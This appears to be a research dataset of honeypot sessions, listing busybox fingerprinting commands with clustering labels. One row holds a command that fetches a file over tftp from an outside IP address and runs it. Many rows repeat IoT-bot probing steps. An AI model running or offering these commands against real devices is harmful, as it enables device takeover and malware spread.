,session,command_freq,input,attack_cat,label_nr,label_desc,duration,SeededKmeans_result,Kmeans_results,PCKmeans_exp_result
38,aa965a08eac9,14,rm .s; tftp -l.i -r.i -g 144.48.170.110:19280; chmod 777 .i; ./.i; exit,Fingerprinting,0,busybox fingerprinting,32.702641248703,0,3,2
39,aa965a08eac9,14,./.i,Fingerprinting,0,busybox fingerprinting,32.702641248703,0,3,2
40,6a86f0839aa6,13,enable,Fingerprinting,0,busybox fingerprinting,5.2600257396698,0,3,2
41,6a86f0839aa6,13,system,Fingerprinting,0,busybox fingerprinting,5.2600257396698,0,3,2
42,6a86f0839aa6,13,system,Fingerprinting,0,busybox fingerprinting,5.2600257396698,0,3,2
43,6a86f0839aa6,13,shell,Fingerprinting,0,busybox fingerprinting,5.2600257396698,0,3,2
44,6a86f0839aa6,13,shell,Fingerprinting,0,busybox fingerprinting,5.2600257396698,0,3,2
45,6a86f0839aa6,13,sh,Fingerprinting,0,busybox fingerprinting,5.2600257396698,0,3,2
46,6a86f0839aa6,13,cat /proc/mounts; /bin/busybox YDABL,Fingerprinting,0,busybox fingerprinting,5.2600257396698,0,3,2
47,6a86f0839aa6,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox YDABL,Fingerprinting,0,busybox fingerprinting,5.2600257396698,0,3,2
48,6a86f0839aa6,13,tftp; wget; /bin/busybox YDABL,Fingerprinting,0,busybox fingerprinting,5.2600257396698,0,3,2
49,6a86f0839aa6,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,Fingerprinting,0,busybox fingerprinting,5.2600257396698,0,3,2
50,6a86f0839aa6,13,while read i,Fingerprinting,0,busybox fingerprinting,5.2600257396698,0,3,2
51,6a86f0839aa6,13,/bin/busybox YDABL,Fingerprinting,0,busybox fingerprinting,5.2600257396698,0,3,2
52,6a86f0839aa6,13,rm .s; exit,Fingerprinting,0,busybox fingerprinting,5.2600257396698,0,3,2
53,c1f83069fa9b,13,enable,Fingerprinting,0,busybox fingerprinting,6.0199134349823,0,3,2
54,c1f83069fa9b,13,system,Fingerprinting,0,busybox fingerprinting,6.0199134349823,0,3,2
55,c1f83069fa9b,13,system,Fingerprinting,0,busybox fingerprinting,6.0199134349823,0,3,2
56,c1f83069fa9b,13,shell,Fingerprinting,0,busybox fingerprinting,6.0199134349823,0,3,2
57,c1f83069fa9b,13,shell,Fingerprinting,0,busybox fingerprinting,6.0199134349823,0,3,2
58,c1f83069fa9b,13,sh,Fingerprinting,0,busybox fingerprinting,6.0199134349823,0,3,2
59,c1f83069fa9b,13,cat /proc/mounts; /bin/busybox TQFXJ,Fingerprinting,0,busybox fingerprinting,6.0199134349823,0,3,2
60,c1f83069fa9b,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox TQFXJ,Fingerprinting,0,busybox fingerprinting,6.0199134349823,0,3,2
61,c1f83069fa9b,13,tftp; wget; /bin/busybox TQFXJ,Fingerprinting,0,busybox fingerprinting,6.0199134349823,0,3,2
62,c1f83069fa9b,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,Fingerprinting,0,busybox fingerprinting,6.0199134349823,0,3,2
63,c1f83069fa9b,13,while read i,Fingerprinting,0,busybox fingerprinting,6.0199134349823,0,3,2
64,c1f83069fa9b,13,/bin/busybox TQFXJ,Fingerprinting,0,busybox fingerprinting,6.0199134349823,0,3,2
65,c1f83069fa9b,13,rm .s; exit,Fingerprinting,0,busybox fingerprinting,6.0199134349823,0,3,2
66,6e88efc81d97,13,enable,Fingerprinting,0,busybox fingerprinting,0.65105652809143,0,3,2
67,6e88efc81d97,13,system,Fingerprinting,0,busybox fingerprinting,0.65105652809143,0,3,2
68,6e88efc81d97,13,system,Fingerprinting,0,busybox fingerprinting,0.65105652809143,0,3,2
69,6e88efc81d97,13,shell,Fingerprinting,0,busybox fingerprinting,0.65105652809143,0,3,2
70,6e88efc81d97,13,shell,Fingerprinting,0,busybox fingerprinting,0.65105652809143,0,3,2
71,6e88efc81d97,13,sh,Fingerprinting,0,busybox fingerprinting,0.65105652809143,0,3,2
72,6e88efc81d97,13,cat /proc/mounts; /bin/busybox POMIF,Fingerprinting,0,busybox fingerprinting,0.65105652809143,0,3,2
73,6e88efc81d97,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox POMIF,Fingerprinting,0,busybox fingerprinting,0.65105652809143,0,3,2
74,6e88efc81d97,13,tftp; wget; /bin/busybox POMIF,Fingerprinting,0,busybox fingerprinting,0.65105652809143,0,3,2
75,6e88efc81d97,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,Fingerprinting,0,busybox fingerprinting,0.65105652809143,0,3,2
76,6e88efc81d97,13,while read i,Fingerprinting,0,busybox fingerprinting,0.65105652809143,0,3,2
77,6e88efc81d97,13,/bin/busybox POMIF,Fingerprinting,0,busybox fingerprinting,0.65105652809143,0,3,2
78,6e88efc81d97,13,rm .s; exit,Fingerprinting,0,busybox fingerprinting,0.65105652809143,0,3,2
79,21d9a34fc2f3,13,enable,Fingerprinting,0,busybox fingerprinting,0.85095739364624,0,3,2
80,21d9a34fc2f3,13,system,Fingerprinting,0,busybox fingerprinting,0.85095739364624,0,3,2
81,21d9a34fc2f3,13,system,Fingerprinting,0,busybox fingerprinting,0.85095739364624,0,3,2
82,21d9a34fc2f3,13,shell,Fingerprinting,0,busybox fingerprinting,0.85095739364624,0,3,2
83,21d9a34fc2f3,13,shell,Fingerprinting,0,busybox fingerprinting,0.85095739364624,0,3,2
84,21d9a34fc2f3,13,sh,Fingerprinting,0,busybox fingerprinting,0.85095739364624,0,3,2
85,21d9a34fc2f3,13,cat /proc/mounts; /bin/busybox JXHMW,Fingerprinting,0,busybox fingerprinting,0.85095739364624,0,3,2
86,21d9a34fc2f3,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox JXHMW,Fingerprinting,0,busybox fingerprinting,0.85095739364624,0,3,2
87,21d9a34fc2f3,13,tftp; wget; /bin/busybox JXHMW,Fingerprinting,0,busybox fingerprinting,0.85095739364624,0,3,2
88,21d9a34fc2f3,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,Fingerprinting,0,busybox fingerprinting,0.85095739364624,0,3,2
89,21d9a34fc2f3,13,while read i,Fingerprinting,0,busybox fingerprinting,0.85095739364624,0,3,2
90,21d9a34fc2f3,13,/bin/busybox JXHMW,Fingerprinting,0,busybox fingerprinting,0.85095739364624,0,3,2
91,21d9a34fc2f3,13,rm .s; exit,Fingerprinting,0,busybox fingerprinting,0.85095739364624,0,3,2
92,067e89c2f99f,13,enable,Fingerprinting,0,busybox fingerprinting,0.89614462852478,0,3,2
93,067e89c2f99f,13,system,Fingerprinting,0,busybox fingerprinting,0.89614462852478,0,3,2
94,067e89c2f99f,13,system,Fingerprinting,0,busybox fingerprinting,0.89614462852478,0,3,2
95,067e89c2f99f,13,shell,Fingerprinting,0,busybox fingerprinting,0.89614462852478,0,3,2
96,067e89c2f99f,13,shell,Fingerprinting,0,busybox fingerprinting,0.89614462852478,0,3,2
97,067e89c2f99f,13,sh,Fingerprinting,0,busybox fingerprinting,0.89614462852478,0,3,2
98,067e89c2f99f,13,cat /proc/mounts; /bin/busybox ZCTOM,Fingerprinting,0,busybox fingerprinting,0.89614462852478,0,3,2
99,067e89c2f99f,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox ZCTOM,Fingerprinting,0,busybox fingerprinting,0.89614462852478,0,3,2
100,067e89c2f99f,13,tftp; wget; /bin/busybox ZCTOM,Fingerprinting,0,busybox fingerprinting,0.89614462852478,0,3,2
101,067e89c2f99f,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,Fingerprinting,0,busybox fingerprinting,0.89614462852478,0,3,2
102,067e89c2f99f,13,while read i,Fingerprinting,0,busybox fingerprinting,0.89614462852478,0,3,2
103,067e89c2f99f,13,/bin/busybox ZCTOM,Fingerprinting,0,busybox fingerprinting,0.89614462852478,0,3,2
104,067e89c2f99f,13,rm .s; exit,Fingerprinting,0,busybox fingerprinting,0.89614462852478,0,3,2
105,b5283ba3eec0,13,enable,Fingerprinting,0,busybox fingerprinting,0.92331051826477,0,3,2
106,b5283ba3eec0,13,system,Fingerprinting,0,busybox fingerprinting,0.92331051826477,0,3,2
107,b5283ba3eec0,13,system,Fingerprinting,0,busybox fingerprinting,0.92331051826477,0,3,2
108,b5283ba3eec0,13,shell,Fingerprinting,0,busybox fingerprinting,0.92331051826477,0,3,2
109,b5283ba3eec0,13,shell,Fingerprinting,0,busybox fingerprinting,0.92331051826477,0,3,2
110,b5283ba3eec0,13,sh,Fingerprinting,0,busybox fingerprinting,0.92331051826477,0,3,2
111,b5283ba3eec0,13,cat /proc/mounts; /bin/busybox UXNFI,Fingerprinting,0,busybox fingerprinting,0.92331051826477,0,3,2
112,b5283ba3eec0,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox UXNFI,Fingerprinting,0,busybox fingerprinting,0.92331051826477,0,3,2
113,b5283ba3eec0,13,tftp; wget; /bin/busybox UXNFI,Fingerprinting,0,busybox fingerprinting,0.92331051826477,0,3,2
114,b5283ba3eec0,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,Fingerprinting,0,busybox fingerprinting,0.92331051826477,0,3,2
115,b5283ba3eec0,13,while read i,Fingerprinting,0,busybox fingerprinting,0.92331051826477,0,3,2
116,b5283ba3eec0,13,/bin/busybox UXNFI,Fingerprinting,0,busybox fingerprinting,0.92331051826477,0,3,2
117,b5283ba3eec0,13,rm .s; exit,Fingerprinting,0,busybox fingerprinting,0.92331051826477,0,3,2
118,e58c3fd179a0,13,enable,Fingerprinting,0,busybox fingerprinting,1.00198745727539,0,3,2
119,e58c3fd179a0,13,system,Fingerprinting,0,busybox fingerprinting,1.00198745727539,0,3,2
120,e58c3fd179a0,13,system,Fingerprinting,0,busybox fingerprinting,1.00198745727539,0,3,2
121,e58c3fd179a0,13,shell,Fingerprinting,0,busybox fingerprinting,1.00198745727539,0,3,2
122,e58c3fd179a0,13,shell,Fingerprinting,0,busybox fingerprinting,1.00198745727539,0,3,2
123,e58c3fd179a0,13,sh,Fingerprinting,0,busybox fingerprinting,1.00198745727539,0,3,2
124,e58c3fd179a0,13,cat /proc/mounts; /bin/busybox OFGYF,Fingerprinting,0,busybox fingerprinting,1.00198745727539,0,3,2
125,e58c3fd179a0,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox OFGYF,Fingerprinting,0,busybox fingerprinting,1.00198745727539,0,3,2
126,e58c3fd179a0,13,tftp; wget; /bin/busybox OFGYF,Fingerprinting,0,busybox fingerprinting,1.00198745727539,0,3,2
127,e58c3fd179a0,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,Fingerprinting,0,busybox fingerprinting,1.00198745727539,0,3,2
128,e58c3fd179a0,13,while read i,Fingerprinting,0,busybox fingerprinting,1.00198745727539,0,3,2
129,e58c3fd179a0,13,/bin/busybox OFGYF,Fingerprinting,0,busybox fingerprinting,1.00198745727539,0,3,2
130,e58c3fd179a0,13,rm .s; exit,Fingerprinting,0,busybox fingerprinting,1.00198745727539,0,3,2
131,c67329299b6d,13,enable,Fingerprinting,0,busybox fingerprinting,1.04880404472351,0,3,2
132,c67329299b6d,13,system,Fingerprinting,0,busybox fingerprinting,1.04880404472351,0,3,2
133,c67329299b6d,13,system,Fingerprinting,0,busybox fingerprinting,1.04880404472351,0,3,2
134,c67329299b6d,13,shell,Fingerprinting,0,busybox fingerprinting,1.04880404472351,0,3,2
135,c67329299b6d,13,shell,Fingerprinting,0,busybox fingerprinting,1.04880404472351,0,3,2
136,c67329299b6d,13,sh,Fingerprinting,0,busybox fingerprinting,1.04880404472351,0,3,2
137,c67329299b6d,13,cat /proc/mounts; /bin/busybox UOXTH,Fingerprinting,0,busybox fingerprinting,1.04880404472351,0,3,2
138,c67329299b6d,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox UOXTH,Fingerprinting,0,busybox fingerprinting,1.04880404472351,0,3,2
139,c67329299b6d,13,tftp; wget; /bin/busybox UOXTH,Fingerprinting,0,busybox fingerprinting,1.04880404472351,0,3,2
140,c67329299b6d,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,Fingerprinting,0,busybox fingerprinting,1.04880404472351,0,3,2
141,c67329299b6d,13,while read i,Fingerprinting,0,busybox fingerprinting,1.04880404472351,0,3,2
142,c67329299b6d,13,/bin/busybox UOXTH,Fingerprinting,0,busybox fingerprinting,1.04880404472351,0,3,2
143,c67329299b6d,13,rm .s; exit,Fingerprinting,0,busybox fingerprinting,1.04880404472351,0,3,2
144,b8bf968f37fe,13,enable,Fingerprinting,0,busybox fingerprinting,1.05241322517395,0,3,2
145,b8bf968f37fe,13,system,Fingerprinting,0,busybox fingerprinting,1.05241322517395,0,3,2
146,b8bf968f37fe,13,system,Fingerprinting,0,busybox fingerprinting,1.05241322517395,0,3,2
147,b8bf968f37fe,13,shell,Fingerprinting,0,busybox fingerprinting,1.05241322517395,0,3,2
148,b8bf968f37fe,13,shell,Fingerprinting,0,busybox fingerprinting,1.05241322517395,0,3,2
149,b8bf968f37fe,13,sh,Fingerprinting,0,busybox fingerprinting,1.05241322517395,0,3,2
150,b8bf968f37fe,13,cat /proc/mounts; /bin/busybox UGJIO,Fingerprinting,0,busybox fingerprinting,1.05241322517395,0,3,2
151,b8bf968f37fe,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox UGJIO,Fingerprinting,0,busybox fingerprinting,1.05241322517395,0,3,2
152,b8bf968f37fe,13,tftp; wget; /bin/busybox UGJIO,Fingerprinting,0,busybox fingerprinting,1.05241322517395,0,3,2
153,b8bf968f37fe,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,Fingerprinting,0,busybox fingerprinting,1.05241322517395,0,3,2
154,b8bf968f37fe,13,while read i,Fingerprinting,0,busybox fingerprinting,1.05241322517395,0,3,2
155,b8bf968f37fe,13,/bin/busybox UGJIO,Fingerprinting,0,busybox fingerprinting,1.05241322517395,0,3,2
156,b8bf968f37fe,13,rm .s; exit,Fingerprinting,0,busybox fingerprinting,1.05241322517395,0,3,2
157,e5f11527a925,13,enable,Fingerprinting,0,busybox fingerprinting,1.23287558555603,0,3,2
158,e5f11527a925,13,system,Fingerprinting,0,busybox fingerprinting,1.23287558555603,0,3,2
159,e5f11527a925,13,system,Fingerprinting,0,busybox fingerprinting,1.23287558555603,0,3,2
160,e5f11527a925,13,shell,Fingerprinting,0,busybox fingerprinting,1.23287558555603,0,3,2
161,e5f11527a925,13,shell,Fingerprinting,0,busybox fingerprinting,1.23287558555603,0,3,2
162,e5f11527a925,13,sh,Fingerprinting,0,busybox fingerprinting,1.23287558555603,0,3,2
163,e5f11527a925,13,cat /proc/mounts; /bin/busybox XMPWF,Fingerprinting,0,busybox fingerprinting,1.23287558555603,0,3,2
164,e5f11527a925,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox XMPWF,Fingerprinting,0,busybox fingerprinting,1.23287558555603,0,3,2
165,e5f11527a925,13,tftp; wget; /bin/busybox XMPWF,Fingerprinting,0,busybox fingerprinting,1.23287558555603,0,3,2
166,e5f11527a925,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,Fingerprinting,0,busybox fingerprinting,1.23287558555603,0,3,2
167,e5f11527a925,13,while read i,Fingerprinting,0,busybox fingerprinting,1.23287558555603,0,3,2
168,e5f11527a925,13,/bin/busybox XMPWF,Fingerprinting,0,busybox fingerprinting,1.23287558555603,0,3,2
169,e5f11527a925,13,rm .s; exit,Fingerprinting,0,busybox fingerprinting,1.23287558555603,0,3,2
170,1563f3008040,13,enable,Fingerprinting,0,busybox fingerprinting,1.33713412284851,0,3,2
171,1563f3008040,13,system,Fingerprinting,0,busybox fingerprinting,1.33713412284851,0,3,2
172,1563f3008040,13,system,Fingerprinting,0,busybox fingerprinting,1.33713412284851,0,3,2
173,1563f3008040,13,shell,Fingerprinting,0,busybox fingerprinting,1.33713412284851,0,3,2
174,1563f3008040,13,shell,Fingerprinting,0,busybox fingerprinting,1.33713412284851,0,3,2
175,1563f3008040,13,sh,Fingerprinting,0,busybox fingerprinting,1.33713412284851,0,3,2
176,1563f3008040,13,cat /proc/mounts; /bin/busybox MGOWX,Fingerprinting,0,busybox fingerprinting,1.33713412284851,0,3,2
177,1563f3008040,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox MGOWX,Fingerprinting,0,busybox fingerprinting,1.33713412284851,0,3,2
178,1563f3008040,13,tftp; wget; /bin/busybox MGOWX,Fingerprinting,0,busybox fingerprinting,1.33713412284851,0,3,2
179,1563f3008040,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,Fingerprinting,0,busybox fingerprinting,1.33713412284851,0,3,2
180,1563f3008040,13,while read i,Fingerprinting,0,busybox fingerprinting,1.33713412284851,0,3,2
181,1563f3008040,13,/bin/busybox MGOWX,Fingerprinting,0,busybox fingerprinting,1.33713412284851,0,3,2
182,1563f3008040,13,rm .s; exit,Fingerprinting,0,busybox fingerprinting,1.33713412284851,0,3,2
183,9461a83ea17c,13,enable,Fingerprinting,0,busybox fingerprinting,1.42423415184021,0,3,2
184,9461a83ea17c,13,system,Fingerprinting,0,busybox fingerprinting,1.42423415184021,0,3,2
185,9461a83ea17c,13,system,Fingerprinting,0,busybox fingerprinting,1.42423415184021,0,3,2
186,9461a83ea17c,13,shell,Fingerprinting,0,busybox fingerprinting,1.42423415184021,0,3,2
187,9461a83ea17c,13,shell,Fingerprinting,0,busybox fingerprinting,1.42423415184021,0,3,2
188,9461a83ea17c,13,sh,Fingerprinting,0,busybox fingerprinting,1.42423415184021,0,3,2
189,9461a83ea17c,13,cat /proc/mounts; /bin/busybox PPTKP,Fingerprinting,0,busybox fingerprinting,1.42423415184021,0,3,2
190,9461a83ea17c,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox PPTKP,Fingerprinting,0,busybox fingerprinting,1.42423415184021,0,3,2
191,9461a83ea17c,13,tftp; wget; /bin/busybox PPTKP,Fingerprinting,0,busybox fingerprinting,1.42423415184021,0,3,2
192,9461a83ea17c,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,Fingerprinting,0,busybox fingerprinting,1.42423415184021,0,3,2
193,9461a83ea17c,13,while read i,Fingerprinting,0,busybox fingerprinting,1.42423415184021,0,3,2
194,9461a83ea17c,13,/bin/busybox PPTKP,Fingerprinting,0,busybox fingerprinting,1.42423415184021,0,3,2
195,9461a83ea17c,13,rm .s; exit,Fingerprinting,0,busybox fingerprinting,1.42423415184021,0,3,2
196,354dcd4fe781,13,enable,Fingerprinting,0,busybox fingerprinting,1.44289231300354,0,3,2
197,354dcd4fe781,13,system,Fingerprinting,0,busybox fingerprinting,1.44289231300354,0,3,2
198,354dcd4fe781,13,system,Fingerprinting,0,busybox fingerprinting,1.44289231300354,0,3,2
199,354dcd4fe781,13,shell,Fingerprinting,0,busybox fingerprinting,1.44289231300354,0,3,2
200,354dcd4fe781,13,shell,Fingerprinting,0,busybox fingerprinting,1.44289231300354,0,3,2
201,354dcd4fe781,13,sh,Fingerprinting,0,busybox fingerprinting,1.44289231300354,0,3,2
202,354dcd4fe781,13,cat /proc/mounts; /bin/busybox QSBSM,Fingerprinting,0,busybox fingerprinting,1.44289231300354,0,3,2
203,354dcd4fe781,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox QSBSM,Fingerprinting,0,busybox fingerprinting,1.44289231300354,0,3,2
204,354dcd4fe781,13,tftp; wget; /bin/busybox QSBSM,Fingerprinting,0,busybox fingerprinting,1.44289231300354,0,3,2
205,354dcd4fe781,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,Fingerprinting,0,busybox fingerprinting,1.44289231300354,0,3,2
206,354dcd4fe781,13,while read i,Fingerprinting,0,busybox fingerprinting,1.44289231300354,0,3,2
207,354dcd4fe781,13,/bin/busybox QSBSM,Fingerprinting,0,busybox fingerprinting,1.44289231300354,0,3,2
208,354dcd4fe781,13,rm .s; exit,Fingerprinting,0,busybox fingerprinting,1.44289231300354,0,3,2
209,de22e71d20cd,13,enable,Fingerprinting,0,busybox fingerprinting,1.54531717300415,0,3,2
210,de22e71d20cd,13,system,Fingerprinting,0,busybox fingerprinting,1.54531717300415,0,3,2
211,de22e71d20cd,13,system,Fingerprinting,0,busybox fingerprinting,1.54531717300415,0,3,2
212,de22e71d20cd,13,shell,Fingerprinting,0,busybox fingerprinting,1.54531717300415,0,3,2
213,de22e71d20cd,13,shell,Fingerprinting,0,busybox fingerprinting,1.54531717300415,0,3,2
214,de22e71d20cd,13,sh,Fingerprinting,0,busybox fingerprinting,1.54531717300415,0,3,2
215,de22e71d20cd,13,cat /proc/mounts; /bin/busybox HTDBM,Fingerprinting,0,busybox fingerprinting,1.54531717300415,0,3,2
216,de22e71d20cd,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox HTDBM,Fingerprinting,0,busybox fingerprinting,1.54531717300415,0,3,2
217,de22e71d20cd,13,tftp; wget; /bin/busybox HTDBM,Fingerprinting,0,busybox fingerprinting,1.54531717300415,0,3,2
218,de22e71d20cd,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,Fingerprinting,0,busybox fingerprinting,1.54531717300415,0,3,2
219,de22e71d20cd,13,while read i,Fingerprinting,0,busybox fingerprinting,1.54531717300415,0,3,2
220,de22e71d20cd,13,/bin/busybox HTDBM,Fingerprinting,0,busybox fingerprinting,1.54531717300415,0,3,2
221,de22e71d20cd,13,rm .s; exit,Fingerprinting,0,busybox fingerprinting,1.54531717300415,0,3,2
222,eb630562e542,13,enable,Fingerprinting,0,busybox fingerprinting,1.66914963722229,0,3,2
223,eb630562e542,13,system,Fingerprinting,0,busybox fingerprinting,1.66914963722229,0,3,2
224,eb630562e542,13,system,Fingerprinting,0,busybox fingerprinting,1.66914963722229,0,3,2
225,eb630562e542,13,shell,Fingerprinting,0,busybox fingerprinting,1.66914963722229,0,3,2
226,eb630562e542,13,shell,Fingerprinting,0,busybox fingerprinting,1.66914963722229,0,3,2
227,eb630562e542,13,sh,Fingerprinting,0,busybox fingerprinting,1.66914963722229,0,3,2
228,eb630562e542,13,cat /proc/mounts; /bin/busybox LXUIV,Fingerprinting,0,busybox fingerprinting,1.66914963722229,0,3,2
229,eb630562e542,13,cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox LXUIV,Fingerprinting,0,busybox fingerprinting,1.66914963722229,0,3,2
230,eb630562e542,13,tftp; wget; /bin/busybox LXUIV,Fingerprinting,0,busybox fingerprinting,1.66914963722229,0,3,2
231,eb630562e542,13,dd bs=52 count=1 if=.s || cat .s || while read i; do echo $i; done < .s,Fingerprinting,0,busybox fingerprinting,1.66914963722229,0,3,2
232,eb630562e542,13,while read i,Fingerprinting,0,busybox fingerprinting,1.66914963722229,0,3,2
233,eb630562e542,13,/bin/busybox LXUIV,Fingerprinting,0,busybox fingerprinting,1.66914963722229,0,3,2
